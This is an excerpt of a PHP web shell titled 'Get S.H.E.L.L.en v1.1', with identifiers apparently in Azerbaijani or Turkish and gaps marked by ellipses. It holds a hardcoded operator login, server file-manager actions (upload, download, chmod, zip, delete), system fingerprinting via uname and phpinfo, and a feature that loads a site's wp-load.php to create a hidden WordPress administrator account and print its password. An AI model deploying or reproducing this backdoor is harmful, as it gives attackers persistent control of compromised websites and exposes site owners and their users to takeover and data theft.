...
$user = 'leon';
$password = 'e174817bc7c0f0a67a6eef67e00ffc4f';
...
else if($ne == 'fayl_upl' && isset($_FILES['ufayl']))
{
...
else if ($ne == 'set_wp_load') {
	$fileName = basename(deshifrele(urldecode($_POST['fayl'])));
	$ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($fileName,0,1)!="/" ? "/" : "";
	$rootPath = realpath(deshifrele(urldecode($_POST['fayl'])));

	if (file_exists($rootPath)) {
		$_SESSION['gr_wp_load'] = $rootPath;
		print "wp-load.php set at {$rootPath}.";
	}
}
		...
		if (isset($_SESSION['gr_wp_load']) && file_exists($_SESSION['gr_wp_load'])) {
			...
			if (username_exists($username) || email_exists($email)) {
				...
				if (is_wp_error($user_id)) {
					...
					print "User created successfully with administrator role | username: {$username}| email: {$email}| password: {$password}.";
				}
			}
		} else {
			print "Set WP Load First";
		}
	} catch (\Throwable $th) {
		print $th->getMessage();
	}
	...
	if ($mod && $rootPath) {
		...
		if ($status) {
			print "chmod {$mod} success to file {$rootPath}";
		} else {
			print "chmod failed";
		}
	}
	...
	if ($mod && $rootPath) {
		$status = chmod($rootPath, octdec($mod));
		if ($status) {
			print "chmod {$mod} success to folder {$rootPath}";
		} else {
			print "chmod failed";
		}
	}
...
<html>
<head>
<title>Get S.H.E.L.L.en v1.1 | BY ..</title>
...
if(function_exists('posix_getegid'))
{
	...
	$qrup = $qid['name'];
	print "<br/><span class='qalin'>Uname:</span> " . php_uname() . "<br/>";
...
if (isset($_SESSION['gr_wp_load'])) {
	print "<span class='qalin'>WP Load:</span> ".$_SESSION['gr_wp_load']."<br/>";
}
qovluquYaz();
print '<hr>';
if($ne=="phpinfo")
				...
				print '<tr>
						...
						if( is_file($faylAdiTam) )
						{
							print (' <a href="javascript:chmod(\'' . htmlspecialchars($adi) . '\' , \''.str_replace("fayl_oxu","chmod",$url).'\');"'.$classN.'>Chmod</a> | <a href="javascript:sehife(\''.str_replace("fayl_oxu","fayl_yukle",$url).'\')"'.$classN.'>Download</a> | ') .
								...
								(' <a href="javascript:setWpLoad(\''.str_replace("fayl_oxu","set_wp_load",$url).'\')"'.$classN.'>' . ($adi == 'wp-load.php' ? '<b>Set wp-load</b>' : 'Set wp-load') . '</a>');
						}
						else if( $adi != '[ . ]' && $adi != '[ .. ]' )
						{
							print (' <a href="javascript:chmodFolder(\'' . urlencode(urlencode(shifrele($faylAdiTam))) . '\')"'.$classN.'>Chmod</a> | <a href="javascript:ziple(\'' . urlencode(urlencode(shifrele($faylAdiTam))) . '\')"'.$classN.'>Zip</a> | ') .
								(' <a href="javascript:silPapka(\'' . urlencode(urlencode(shifrele($faylAdiTam))) . '\')"'.$classN.'>Delete</a>');
						}
						print '</td>
					</tr>';
			}
...
function chmodFolder(url)
{
	var mod = prompt('mod:');
	if( mod ){
		sehife("?ne=chmod_folder&mod=" + mod + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>&zf=" + url)
	}
}
function createWpAdmin()
{
